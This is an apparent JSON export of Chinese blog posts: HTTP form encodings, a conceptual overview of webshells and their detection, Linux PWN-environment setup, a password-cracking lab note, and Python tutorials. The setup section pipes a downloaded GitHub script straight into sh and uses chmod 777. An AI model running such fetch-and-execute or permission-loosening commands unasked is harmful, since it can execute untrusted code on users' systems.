title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3 Content-Type 被指定为 application/x-www-form-urlencoded；其次，提交的数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL 转码。 multipart/form-data 使用表单上传文件时，必须让 &lt;form&gt; 表单的 enctype 等于 multipart/form-data。 application/json text/xml: 一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范 相比之下，get方式的数据提交方式（编码方式）只有一种，就是application/x-www-form-urlencoding webshellwebshell是网页后门，本质上是一种网页文件，一般由asp,php,jsp,asp.net等语言开发，shell的含义是取得对服务器某种程度上操作命令。常见的webshell有小马，大马，一句话木马 作用 webshell被站长常用于网站管理、服务器管理等。根据FSO权限不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。 被入侵者利用，从而达到控制网站服务器的目的。 webshell常见检测方式 静态检测：通过匹配特征码、特征值、危险函数来查找webshell，但只能查找已知的webshell，主流的检测方法有关键字检查、审核代码逻辑等。速度快、对已知的webshell查找准确率高；误报率高，存在漏报，会被绕过。 动态监测： webshell在执行时表现出来的特征，我们称为动态特征。准确性高，但耗时、占用资源多 主流的检测方法有文件状态对比(File Info Comparison)、运行特征(Feature Matching)、访问行为检测(Access Behavior)等。","categories":[],"tags":[{"name":"墨者学院","slug":"墨者学院","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"Linux18下搭建PWN环境","slug":"Linux18下搭建pwn环境","date":"2022-11-02T01:07:48.104Z","updated":"2022-11-02T02:46:03.078Z","comments":true,"path":"2022/11/02/Linux18下搭建pwn环境/","link":"","permalink":"https://sinky.top/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/","excerpt":"","text":"安装Pwntoolssudo apt-get update #更新源 sudo apt-get install python-pip #安装pip 出现报错 : 12E: 无法获得锁 /var/lib/dpkg/lock-frontend - open (11: 资源暂时不可用)E: 无法获取 dpkg 前端锁 (/var/lib/dpkg/lock-frontend)，是否有其他进程正占用它？ 解决方法： 123sudo rm /var/lib/dpkg/lock-frontendsudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock 续： pip install --upgrade pip # 升级pip sudo pip install setuptools #安装setuptools sudo apt-get install python-dev #安装python-dev sudo pip install pwntools #安装pwntools 安装结束之后进入python交互模式，输入import pwn后无报错即可。 安装其他插件123456789101112131415161718192021 # 安装socatsudo apt install socat # 安装socat sudo apt install socat # 安装ziosudo pip install zio​ # 安装gccsudo apt-get install gcc # 安装gcc-multilibsudo apt-get install gcc-multilib​ # 安装geditsudo apt install gedit # 安装vimsudo apt install vim #安装peda插件git clone https://github.com/longld/peda.git ~/pedaecho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit #安装gef插件 wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.pyecho source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit IDA远程调试Linux顺便搞一下得了。 找IDA文件/dbgsrv下面的linux_server和linux_server64,我ida里的是linux_serverx64，不过问题不大。 将俩文件复制到linux下，并复制保存好改路径，一会儿要用。 ifconfig查看linux的ip，然后复制保存好，监听端口一般都是默认的23946不用管。 在linux上运行linux_server报错权限不足，用命令chmod开一下。 chmod 777 linux_server 在linux端运行linux_server: ./linux_server 打开ida（32位的） 然后 Debugger-&gt; Run-&gt; Remote Linux debugger 输入信息： 12345Application: /home/sudo/Desktop/ida_linuxsever/linux_serverDirectory: /home/q/桌面/ida_linuxseverParameters: [不用写]Hostname: [linux的ip]Password: [linux的密码] 连接成功。 拓展chmod用法chmod 文件/目录权限设置命令 语法：chmod [对谁操作] [操作符] [赋予的权限] 文件名 操作对象： u 用户user,表现文件或目录的所有者 g 用户组group 表现文件或目录所属的用户组 o 其他用户other a 所有用户all 操作符： + 添加权限 - 减少权限 = 直接给定一个权限 权限： r、w、x 实例：（网上找的，感觉以后直接拿来用就好了） 12345678$ chmod u+x file 给file的属主增加执行权限$ chmod 751 file 给file的属主分配读、写、执行(7)的权限，给file的所在组分配读、执行(5)的权限，给其他用户分配执行(1)的权限$ chmod u=rwx,g=rx,o=x file 上例的另一种形式$ chmod =r file 为所有用户分配读权限$ chmod 444 file 同上例$ chmod a-wx,a+r file 同上例$ chmod -R u+r directory 递归地给directory目录下所有文件和子目录的属主分配读的权限$ chmod 4755 设置用ID，给属主分配读、写和执行权限，给组和其他用户分配读、执行的权限。 其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。r=4，w=2，x=1 若要rwx属性则4+2+1=7；若要rw-属性则4+2=6；若要r-x属性则4+1=5。 ​","categories":[],"tags":[{"name":"搭建环境","slug":"搭建环境","permalink":"https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"},{"name":"PWN","slug":"PWN","permalink":"https://sinky.top/tags/PWN/"},{"name":"ida远程","slug":"ida远程","permalink":"https://sinky.top/tags/ida%E8%BF%9C%E7%A8%8B/"},{"name":"linux","slug":"linux","permalink":"https://sinky.top/tags/linux/"}]},{"title":"靶场：Xls文件分析溯源","slug":"靶场：XLS文件分析溯源","date":"2022-10-10T12:50:30.608Z","updated":"2022-10-10T14:02:25.486Z","comments":true,"path":"2022/10/10/靶场：XLS文件分析溯源/","link":"","permalink":"https://sinky.top/2022/10/10/%E9%9D%B6%E5%9C%BA%EF%BC%9AXLS%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/","excerpt":"","text":"题目背景介绍 墨者机缘巧合下得到了一个Xls文件，打开却发现该文件带密码验证。 实训目标 了解Xls文件的密码猜解手段； 解题方向 对文件作密码猜解手段 解题搜到一个将xls文件后缀改成rar然后删除对应信息，然后解密的手段，试了一下，office2019没有这个bug，hhh. 不小心看到了评论区的解答，用了aopr直接把密码给爆破了……","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"墨者学院","slug":"墨者学院","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"文件分析","slug":"文件分析","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"}]},{"title":"Python学习10-学生信息管理系统","slug":"python学习10","date":"2022-09-25T03:21:41.448Z","updated":"2022-10-10T13:00:20.126Z","comments":true,"path":"2022/09/25/python学习10/","link":"","permalink":"https://sinky.top/2022/09/25/python%E5%AD%A6%E4%B9%A010/","excerpt":"","text":"需求分析 添加学生及成绩信息 将学生信息保存到文件中 修改和删除学生信息 查询学生信息 根据学生成绩进行排序 统计学生的总分 系统开发环境 操作系统：win10 python解释器：3.9 开发工具：pycharm python内置模块：os,re 主函数功能 退出系统 录入学生信息，insert() 查找学生信息，search() 删除学生信息，delete() 修改学生信息，modify() 对学生成绩排序，sort() 统计学生总人数，total() 显示所有的学生信息，show()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习9","slug":"python学习9","date":"2022-09-23T04:08:22.625Z","updated":"2022-09-23T12:19:31.353Z","comments":true,"path":"2022/09/23/python学习9/","link":"","permalink":"https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/","excerpt":"","text":"模块 一个模块中可以包含N多个函数 在python中一个扩展名为.py的文件就是一个模块 好处： 方便其他程序和脚本的导入并使用 避免函数名和变量名冲突 提高代码的可维护性和可重用性 自定义模块 创建模块：新建一个.py文件，尽量不要与python自带的标准名呈相同 导入模块： 所有： import 模块名称 [as 别名] 指定： from 模块名称 import 函数/变量/类 123456789import math#关于数学运算print(id(math))print(type(math))#&lt;class 'module'&gt;print(math)#&lt;module 'math' (built-in)&gt;print(math.pi)#3.141592653589793print(dir(math))print(math.pow(2,3))#8.0print(math.ceil(9.00001))#10 ceil 天花板print(math.floor(9.99999))#9 floor 地板 或： from math import pi import math print(pi)#3.141592653589793 print(pow(2,3))#8 定义位置在builtins.py print(math.pow(2,3))# 8.0 定义位置在math.py eg: (1) 创建calc.py 作为自定义模块 def add(a,b): return a+b def div(a,b): return a/b (2)创建demo3.py调用自定义模块calc.py import calc print(calc.add(10,20)) print(calc.div(10,4)) 或 from calc import add print(add(10,20)) 以主程序形式运行在每个模块的定义中都包括一个记录模块名称的变量__name__，程序可以检查该变量以确定它在哪个模块中执行，若一个模块不是被导入到其他程序中执行，那么它可能在解释器的顶级模块中执行，顶级模块的__name__变量的值为__main__ if __name__=='__main__': pass 新建calc1.py中： def add(a,b): return a+b if __name__=='__name__': print(add(10,20)) 在demo4.py中： import calc1 print(calc1.add(100,200)) 只有运行calc1.py时，才会执行add(10,20);当demo4.py调用calc1时，不执行if语句中的内容 Python中的包 包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下 作用：代码规范；避免模块名称冲突 包与目录的区别： 包含__init__.py文件的目录称作包 目录中通常不包含__init__.py文件 包的导入：import 包名.模块名 包：New-&gt;Python package 默认有__init__.py 目录：New-&gt;Directory eg: 新建包pageage，在其下新建模块moduleA.py和moduleB.py #moduleA.py a=10 #moduleB.py b=100 新建demo5.py用于导入包： import pageage.moduleA as ma #ma为别名 #print(pageage.moduleA.a) print(ma.a) 导入带有包的模块时： 使用import方式，只能跟包名或模块名 import pageage import calc 使用from…import可以导入包，模块，函数，变量 from pageage import moduleA from pageage.moduleA import a 常用内置模块 sys 与python解释器及其环境操作相关的标准库 time 提供与时间相关的各种函数的标准库 os 访问操作系统服务功能的标准库 calendar 日期相关标准库 urllib 读取来自我网上（服务器）的数据标准库 json 用于使用JSON序列化和反序列化对象 re 用于在字符串中执行正则表达式匹配和替换 math 算术相关标准库 decimal 精确控制运算精度，有效数位和四舍五入的十进制运算 logging 日志信息 123456789101112import sysprint(sys.getsizeof(24))# 获得所占内存大小 28print(sys.getsizeof(45))#28print(sys.getsizeof(True))#28print(sys.getsizeof(False))#24import timeprint(time.time())#1663919662.3144715print(time.localtime(time.time()))#time.struct_time(tm_year=2022, tm_mon=9, tm_mday=23, tm_hour=15, tm_min=54, tm_sec=53, tm_wday=4, tm_yday=266, tm_isdst=0)import urllib.requestprint(urllib.request.urlopen('http://www.baidu.com').read())import mathprint(math.pi)#3.141592653589793 第三方模块的安装及使用安装：pip install 模块名 使用：import 模块名 eg: pip install schedule ps：因为我电脑中是python2 3共存，所以先去安装了一下pip pip下载地址： https://pypi.org/project/pip/#files 安装：python3.exe -m pip install pip22全名 123456789import scheduleimport timedef job(): print('哈哈----') #每三秒执行一次job()schedule.every(3).seconds.do(job)while True: schedule.run_pending()#启动 time.sleep(1)#给予缓冲时间，休眠一秒 编码格式python解释器 ——Unicode(内存) .py文件 在磁盘上 ——UTF-8(外存) eg: #encoding=GBK 文件读写 文件读写俗称‘IO操作’ 内置函数open()创建文件对象 file=open(filename [,mode,encoding]) file: 被创建的文件对象 mode: 打开模式默认为只读 encoding: 默认文本文件中字符的编写格式为GBK eg: 在磁盘上创建a.txt，内容：’中国’ 用pycharm打开，转GBK 新建.py文件 123file=open('a.txt','r',encoding='UTF-8')#r 只读print(file.readlines())#['中国\\n']file.close()#关闭系统释放资源 ps: 转不了GBK,只好在读取的时候就设定编码格式了 常用文件打开模式按文件中数据的组织形式分类： 文本文件：存储普通’字符’文本，默认unicode，可用txt打开 二进制文件：以’字节’存储，必须用专用软件打开 打开模式： r 只读，文件指针在文件开头 w 只写，文件不存在则创建，存在则覆盖原内容，文件指针在文件开头 a 追加，文本不在则创建，存在则在原内容后追加内容，文件指针在文件末尾 b 以二进制方式打开文件，不可单独使用 + 读写，不可单独使用 123file=open('b.txt','w')file.write('Python')file.close() 创建了b.txt，内容为：Python eg: 在根目录下添加图片：logo.png 12345src_file=open('logo.png','rb')#打开logo.png,只读target_file=open('copylogo.png','wb')#创建copylogo.pngtarget_file.write(src_file.read())#读取的logo.png内容写到copylogo.png中target_file.close()#释放资源src_file.close()#释放资源 文件对象的常用方法 read([size]) 从文件中读size个字节或字符内容，返回略。若无size值则读取全部 readline() 读一行 readlines() 读每一行，单独成对象放入列表中 write(str) 将str写入文件 writelines(s_list) 将列表s_list写入文件，不加换行符 seek(offest[where]) tell() 返回文件指针当前位置 flush() 缓冲区内容写入文件，但不关闭文件 close() 缓冲股权内容写入文件，同事关闭文件，释放资源 1234567891011121314151617181920file=open('a.txt','r',encoding='utf-8')print(file.read())#中国\\n美丽print(file.read(2))#中国print(file.readline())#中国print(file.readlines())#['中国\\n', '美丽'] #seek tell writelinesfile=open('c.txt','a')file.write('hello')lst=['java','go','python']file.writelines(lst)#hellohellojavagopythonfile=open('c.txt','r')file.seek(2)#从第二个字节开始读print(file.read())#llohellojavagopythonprint(file.tell())#22 #flush()file=open('d.txt','a')file.write('hello')file.flush()file.write(' world')#hello worldfile.close() with语句（上下文管理器）自动管理上下文资源，确保文件正确关闭释放资源 12345with open('b.txt','r') as file: print(file.read())#Pythonwith open('logo.png','rb') as src_file: with open('copy2logo.png','wb') as target_file: target_file.write(src_file.read()) 目录操作os模块与操作系统有关 os模块与os.path模块对目录或文件操作 12345import osos.system('notepad.exe')#打开记事本os.system(('calc.exe'))#打开计算器 #直接调用可执行文件os.startfile('..\\\\Tencent\\\\QQ\\\\Bin\\\\QQ.exe')# 打开QQ 相关函数 getcwd() 返回当前工作目录 listdir(path) 返回指定路径下的文件和目录信息 mkdir(path [,mode]) 创建目录 makedirs(path/path1/……） 创建多级目录 rmdir() 删除目录 removedirs() 删除多级目录 chdir() 将path设置为当前工作目录 12345678910import osprint(os.getcwd())lst=os.listdir('../python学习下-面向对象')print(lst)os.mkdir('newdir')os.makedirs('A/B/C') #os.rmdir('newdir') #os.removedirs('A/B/C')os.chdir('..\\\\python学习下-面向对象')print(os.getcwd()) os.path模块相关函数 abspath(path) 获取绝对路径 exists() 判断目录是否存在，在True,不在False join(path,name) 将目录与目录或文件名拼接起来 splitext() 分离文件名和扩展名 basename() 从一个目录中提取文件名 dirname(path) 从一个路径中提取文件路径，不包括文件名 isdir(path) 用于判断是否为路径 12345678import os.pathprint(os.path.abspath('demo14.py'))print(os.path.exists('demo2.py')) # Trueprint((os.path.join('D:\\\\','demo14.py'))) #D:\\demo14.pyprint(os.path.split('demo14.py')) #('', 'demo14.py')print(os.path.splitext('demo14.py')) #('demo14', '.py')print(os.path.basename('D:\\demo14.py')) #demo14.pyprint(os.path.dirname('D:\\demo14.py')) #D:\\ eg: 列出指定目录下的所有py文件 123456import ospath=os.getcwd()lst=os.listdir(path)for filename in lst: if filename.endswith('.py'): print(filename) eg: 目录如下： python: demo16.py newdir: 1.py 2.py sub: sub1.py 12345678910111213import ospath=os.getcwd()lst_files=os.walk(path)for dirpath,dirname,filename in lst_files: print(dirpath) print(dirname) print(filename) print('-------------') for dir in dirname: print(os.path.join(dirpath,dir)) for file in filename: print(os.path.join(dirpath,file)) print('------------------')","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习8","slug":"python学习8","date":"2022-09-19T11:54:03.008Z","updated":"2022-09-21T13:44:42.826Z","comments":true,"path":"2022/09/19/python学习8/","link":"","permalink":"https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/","excerpt":"","text":"面向对象篇啦！！！！ 类与对象类：多个类似事物组成的群体；数据类型 对象：100，99是int类下包含的相似不相同个例，称为实例或对象（一切皆对象） 类的创建12class Student: pass 类的组成：类属性、实例方法、静态方法、类方法 12345678910111213141516171819class Student:#Student为类名，由一个或多个单词组成，每个单词首字母大写，其余小写 native_pace='内蒙'#直接写在类中的变量成为类属性 def __init__(self,name,age):#初始化 self.name=name#self.name成为实体属性，进行了赋值操作，将局部变量name值赋给实体属性 self.age=age #实例方法 def eat(self): print('学生吃饭函数') #静态方法 @staticmethod def method(): print('使用staticmethod进行修饰，为静态方法') #类方法 @classmethod def cm(cls): print('使用classmethod进行修饰，为类方法') #在类之外定义的称为函数，在之内的称为方法def drink(): print('类之外定义的，是函数') 对象的创建又称类的实例化：实例名=类名() 12345stu=Student('Jack',20)print(stu.name)#实例属性#Jackprint(stu.age)#20stu.eat()#学生吃饭函数Student.eat(stu)#学生吃饭函数,二者功能相同 类属性，类方法，静态方法1.类属性：类中方法外的变量为类属性，被该类所有对象共享 1234567print(Student.native_pace)#内蒙stu1=Student('Jack',20)stu2=Student('Rose',30)print(stu1.native_pace)#内蒙print(stu2.native_pace)#内蒙Student.native_pace='天津'print(stu1.native_pace)#天津 2.类方法：使用@classmethod修饰，用类名直接访问 Student.cm() 3.静态方法：使用@staticmethod修饰，用类名直接访问 Student.method() 4.动态绑定属性和方法 123456789101112131415class Student: def __init__(self,name,age): self.name=name self.age=age def eat(self): print(self.name+'在吃饭')stu1=Student('张三',20)stu2=Student('李四',30)stu1.gender='女'#动态绑定属性print(stu1.name,stu1.age,stu1.gender)#张三 20 女print(stu2.name,stu2.age)#李四 30def show():#动态绑定方法 print('定义在类之外，称为函数')stu1.show=showstu1.show()#定义在类之外，称为函数 面向对象三大特征封装提高程序安全性，将数据（属性）和行为（方法）包装到类对象中，在方法内部对属性进行操作，在类对象的为外部调用方法。 在python表属性私有，不希望属性在类对象外部被调用，前面加两个下划线。 12345678class Car: def __init__(self,brand): self.brand=brand def start(self): print('汽车已启动')car=Car('宝马X5')car.start()#汽车已启动print(car.brand)#宝马X5 eg: 123456789101112class Student: def __init__(self,name,age): self.name=name self.__age=age def show(self): print(self.name,self.__age)stu=Student('Jack',20)stu.show()#Jack 20print(stu.name)#Jack #print(stu.__age)#类外不可调用私有print(dir(stu))print(stu._Student__age)#在类外可以使用_Student__age访问私有 继承提高的代码复用性 123456789101112131415161718class Person(object): def __init__(self,name,age): self.name=name self.age=age def info(self): print(self.name,self.age)class Student(Person): def __init__(self,name,age,num): super().__init__(name,age) self.num=numclass Teacher(Person): def __init__(self,name,age,tyear): super().__init__(name,age) self.tyear=tyearstu=Student('Jack',20,'1001')teacher=Teacher('Rose',30,10)stu.info()#Jack 20teacher.info()#Rose 30 多继承123456class A(object): passclass B(object): passclass C(A,B): pass 方法重写若子类对父类某个属性或方法不满意，可在子类中对其进行重写 子类重写后的方法可用super().xxx调用父类2中被重写的方法 1234567891011121314151617181920212223242526class Person(object): def __init__(self,name,age): self.name=name self.age=age def info(self): print(self.name,self.age)class Student(Person): def __init__(self,name,age,num): super().__init__(name,age) self.num=num #方法重写 def info(self): super().info() print(self.num)class Teacher(Person): def __init__(self,name,age,tyear): super().__init__(name,age) self.tyear=tyear #方法重写 def info(self): super().info() print(self.tyear)stu=Student('Jack',20,'1001')teacher=Teacher('Rose',30,10)stu.info()#Jack 20 1001teacher.info()#Rose 30 10 object类 是所有类的父类 内置函数dir()可查看指定对象所有属性 __str__()方法：返回一个对于对象的描述，对应于内置函数str()经常用于print()方法，查看对象信息 12345678910class Student: def __init__(self,name,age): self.name=name self.age=age def __str__(self): return '我名字是{0},今年{1}岁'.format(self.name,self.age)stu=Student('Jack',20)print(dir(stu))print(stu)#我名字是Jack,今年20岁print(type(stu))#&lt;class '__main__.Student'&gt; 多态1.不知变量引用类型，仍可以用此变量调用方法，在运行过程中根据变量所用对象类型，动态决定调用哪个对象中的方法。 123456789101112131415161718class Animal: def eat(self): print('动物吃东西')class Dog(Animal): def eat(self): print('狗吃骨头')class Cat(Animal): def eat(self): print('猫吃鱼')class Person: def eat(self): print('人吃饭')def fun(obj): obj.eat()fun(Cat())#猫吃鱼fun(Dog())#狗吃骨头fun(Animal())#动物吃东西fun(Person())#人吃饭 2.静态语言与动态语言 （1）静态语言实现多态的三个必要条件：继承、方法重写、父类引用。指向子类对象。 （2）动态语言的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子，游泳似鸭，收起来也似鸭，那么这只鸟可被称为鸭子。在鸭子类型中，无需关心对象是什么类型，到底是不是鸭子，只关心对象的行为。 特殊方法和特殊属性特殊属性__dict__获得类对象或者实例对象所绑定的所有属性和方法的字典 1234567891011121314151617print(dir(object))class A: passclass B: passclass C(A,B): def __init__(self,name,age): self.name=name self.age=agex=C('Jack',20)# x为C类的一个实例对象print(x.__dict__)#实例对象的属性字典 {'name': 'Jack', 'age': 20}print(C.__dict__)#{'__module__': '__main__', '__init__': &lt;function C.__init__ at 0x000002B51547DC10&gt;, '__doc__': None}print(x.__class__)#输出了对象所属的类 &lt;class '__main__.C'&gt;print(C.__bases__)#C类的父类类型元素 (&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)print(C.__base__)#类的基类 &lt;class '__main__.A'&gt;print(C.__mro__)#类的层次结构 (&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)print(A.__subclasses__())#子类的列表 [&lt;class '__main__.C'&gt;] 特殊方法 __len__() 通过重写此方法，让len()的参数可以自定义类型 __add__() 通过重写此方法，令自定义对象具有相加的功能 __new__() 创建对象 __init__() 对创建的对象初始化 12345678910class Student: def __init__(self,name): self.name=name def __add__(self,other): return self.name+other.namestu1=Student('Jack')stu2=Student('Rose')s=stu1+stu2print(s)#JackRoseprint(stu1.__add__(stu2))#JackRose 1234def __led__(self): return len(self.name)···print(len(s))#8 eg: 12345678910111213141516171819class Person: def __new__(cls,*args,**kwargs): print('__new__被调用执行了，cls的id值为{0}'.format(id(cls))) obj=super().__new__(cls) print('创建对象id为{0}'.format(id(obj))) return obj def __init__(self,name,age): self.name=name self.age=ageprint('object类对象id为{0}'.format(id(object)))print('Person类对象id为{0}'.format(id(Person))) #创建Person类的实例对象p1=Person('Jack',20)print('p1这个Person类的实例对象id为{0}'.format(id(p1))) #object类对象id为140723223092736 #Person类对象id为2976723261008 #__new__被调用执行了，cls的id值为2976723261008 #创建对象id为2976753841488 #p1这个Person类的实例对象id为2976753841488 解读： 执行p1=Person()，将值传入class Person中的cls new()创建对西昂obj,传值cls obj返回，传入初始化__init__() 初始化后返回p1 类的浅拷贝与深拷贝 变量的赋值操作 浅拷贝：对象包含的子对象内容不拷贝，因此，源对象与拷贝对象会引用同一个对象 深拷贝：使用copy模块中的deepcopy函数，递归拷贝对象中包含的子对象，源对象和拷贝对象所有的子对象也不相同。 1234567891011121314151617181920212223class Cpu: passclass Disk: passclass Computer: def __init__(self,cpu,disk): self.cpu=cpu self.disk=disk #变量的赋值cpu1=Cpu()cpu2=cpu1print(cpu1,cpu2) #类的浅拷贝disk=Disk()computer=Computer(cpu1,disk)import copycomputer2=copy.copy(computer)print(computer,computer.cpu,computer.disk)#&lt;__main__.Computer object at 0x000002B5136EFB20&gt;，&lt;__main__.Cpu object at 0x000002B51463B490&gt;，&lt;__main__.Disk object at 0x000002B51463B910&gt;print(computer2,computer2.cpu,computer2.disk)#&lt;__main__.Computer object at 0x000002B5148602E0&gt;，&lt;__main__.Cpu object at 0x000002B514860460&gt;，&lt;__main__.Disk object at 0x000002B5148601C0&gt; #只拷贝computer,不拷贝子对象(disk,cpu) #深拷贝computer3=copy.deepcopy(computer)print(computer3,computer3.cpu,computer3.disk)#&lt;__main__.Computer object at 0x000002B51541C730&gt; &lt;__main__.Cpu object at 0x000002B51541CBE0&gt; &lt;__main__.Disk object at 0x000002B51541C160&gt;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习7","slug":"python学习7","date":"2022-09-19T11:28:00.378Z","updated":"2022-09-19T15:05:38.455Z","comments":true,"path":"2022/09/19/python学习7/","link":"","permalink":"https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/","excerpt":"","text":"Bug1.常见类型 (1)语法错误：SyntaxError (2)索引越界问题：IndexError 123456lst=[1,2,3,4]print(lst[4])l=[]l=append('a','b','c')print(l) #修改：l.append('a') (3)思路不清导致的问题解决方案 使用print() 用 #暂时注释代码(4)被动：用户输入错误导致返回错误 Python异常处理机制Python提供了异常处理机制，可以在异常出现时即时捕获。内部消化，令程序继续运行。 try:… except 异常类型:……1234567try: a=int(input('Input a num:')) b=int(input('Input a num:')) c=a/b print('c=',c)except ZeroDivisionError: print('Sorry,Not is 0') 多个except结构：try…except…excep…except BaseException:…1234567891011try: a=int(input('Input a num:')) b=int(input('Input a num:')) c=a/b print('c=',c)except ZeroDivisionError: print('Sorry,Not is 0')except ValueError: print('input number')except BaseException as e: print(e) try…except…finallyfinally无论是否异常都执行，常用于释放try中申请的资源。 常见异常类型 ZeroDivisionError ——除零（所有数据类型） IndexError ——序列中没有此索引（index） KeyError ——映射中没有此链 NameError ——未声明初始化对象 SyntaxError ——Python语法错误 ValueError ——传入无效的参数 traceback模块打印异常信息 12345import tracebacktry: print(1/0)except: traceback.print_exc() PyCharm开发环境的调试1.断点：程序运行到此处暂时挂起，停止执行 2.调试视图： （1）工具栏按钮：运行三角键右侧蜘蛛样式 （2）右键编辑区：debug’模块名’ （3）shift+F9","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Python学习6","slug":"python学习6","date":"2022-09-16T12:35:21.580Z","updated":"2022-09-19T05:16:18.032Z","comments":true,"path":"2022/09/16/python学习6/","link":"","permalink":"https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/","excerpt":"","text":"字符串python基本数据类型，不可变字符序列 驻留机制仅保存一份相同且不可变字符串的方法。 123456a='python'b='python'c='python'print(a,id(a))print(b,id(b))print(c,id(c))#python 2381469127728 驻留机制的几种情况（交互模式） 字符串的长度为0或1时 符合标识符的字符串 字符串只在编译时进行驻留，而非运行时 [-5,256] 之间的整数数字 sys中的intern方法强留2个字符串指向同一个对象；pycharm对字符串进行了优化处理 常用操作查询 index() 查找子串第一次出现的位置，若不存在返回ValueError rindex() 查找子串最后一次出现的位置，若不存在返回ValueError find() 查找子串第一次出现的位置，若不存在返回-1 rfind() 查找子串最后一次出现的位置，若不存在返回-1 12345s='hello,hello'print(s.index('lo')) #3print(s.rindex('lo'))#9print(s.find('lo'))#3print(s.rfind('lo'))#9 大小写转换 upper() 所有字母转大写 lower() 所有字母转小写 swapcase() 大写转小写，小写转大写 capitalize() 首字母大写，其余小写 title() 每个单词首字母大写，剩余字符转小写 12345678910111213141516s='hello,Python'a=s.upper()#转后产生新的字符串print(a)#HELLO,PYTHON print(a,id(a)) #1810982406960print(s,id(s)) #hello,Python 1810982405680print(s.lower())#hello,python 转后产生新的字符串print('------')b=s.lower()print(b,id(b)) #hello,python 1810996753072print(s,id(s)) #hello,Python 1810982398768print(b == s)print(b is s)#Falseprint('------')s2='hello,Python'print(s2.swapcase()) #HELLO,pYTHONprint(s2.title())#Hello,Python 内容对齐 center() 居中对齐，center([宽度],[填充符]) ljust 左对齐 rjust 右对齐 zfill() 右对齐，左边以0填充，zfill([宽度]) 12345678s='hello,Python'print(s.center(20,'*'))#****hello,Python****print(s.ljust(20,'*'))#hello,Python********print(s.ljust(10))#hello,Python 宽度小于字符串本身，则返回字符串本身print(s.rjust(20,'*'))#********hello,Pythonprint(s.rjust(20))# hello,Pythonprint(s.zfill(20))#00000000hello,Pythonprint('-8910'.zfill(8))#-0008910 劈分 split() 从字符串左边开始劈分，默认以空格劈分，返回结果为列表；以参数sep指定分隔符；以参数maxsplit指定分隔最大次数 rsplit() 从右边开始劈分 12345678s='hello world Python'l=s.split()print(l)#['hello', 'world', 'Python']s1='hello|world|Python'print(s1.split(sep='|'))#['hello', 'world', 'Python']print(s1.split(sep='|',maxsplit=1))#['hello', 'world|Python']print(s.split())#['hello', 'world', 'Python']print(s1.rsplit(sep='|',maxsplit=1))#['hello|world', 'Python'] 判断字符串操作 isidentifier() 是否合法标识符（字母数字下划线） isspace() 是否全是空格 isalpha() 是否全是字母 isdecimal() 是否全是十进制数字 isnumeric() 是否全是数字 isalnum() 是否全是数字和字母组成 替换合并 replace() 字符串替换 join() 河滨，列表或元组中字符串合并为一个字符串 12345678s='hello,Python'print(s.replace('Python','Java'))#hello,Javas1='hello,Python,Python,Python'print(s.replace('Python','Java',2))#hello,Javalst=['hello','java','python']print('|'.join(lst))#hello|java|pythonprint(''.join(lst))#hellojavapythonprint('*'.join('Python'))#P*y*t*h*o*n 比较运算符&gt; &gt;= &lt; &lt;= == != 1234print('apple'&gt;'app')#Trueprint('apple'&gt;'banana')#Falseprint(ord('a'),ord('b'))#97 98print(chr(97),chr(98))#a b ‘==’ 比较 value ‘is’ 比较 id 12345a=b='Python'c='Python'print(a==b)#Trueprint(b==c)#Trueprint(id(a),id(b),id(c))#1621331059952 1621331059952 1621331059952 切片 [start🔚step]字符串不可变，切片后将产生新对象 123456789s='hello,python's1=s[:5]s2=s[6:]s3='!'newstr=s1+s3+s2print(s1)#helloprint(s2)#pythonprint(s3)#!print(newstr)#hello!python 格式化字符串 %作占位符 '我叫%s'%(name) {}作占位符 '我叫{0},今年{1}岁，我真的是{0}'.format(name,age) 12345name='张三'age=20print('我叫%s,今年%d岁'%(name,age))#我叫张三，今年20岁print('我叫{0},今年{1}岁'.format(name,age))print(f'我叫{name},今年{age}岁') eg: 123456print('%10d'%99)# 99;10表示宽度print('%.3f'%3.1415926)#3.142；#.3表示小数点后三位print('%10.3f'%3.1415926)# 3.142print(' ---- ')print('{0:.3f}'.format(3.1415926)) #3.142print('{0:10.3f}'.format(3.1415926))# 3.142 编码转换编码：字符串转二进制 解码：二进制转字符串 GBK中，一个中文占两个字节；UTF-8中，一个中文占三个字节 